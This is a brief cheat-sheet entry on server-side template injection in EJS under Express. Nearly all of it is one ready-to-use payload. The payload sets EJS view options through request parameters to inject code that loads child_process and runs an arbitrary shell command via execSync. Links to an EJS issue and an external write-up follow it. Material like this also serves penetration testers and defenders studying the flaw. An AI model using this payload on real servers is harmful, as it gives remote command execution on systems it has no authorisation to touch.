---
title: EJS SSTI (Express)
---

### TL;TR

```
settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('[COMMAND]').toString();
```

### References

- https://github.com/mde/ejs/issues/735
- https://eslam.io/posts/ejs-server-side-template-injection-rce/
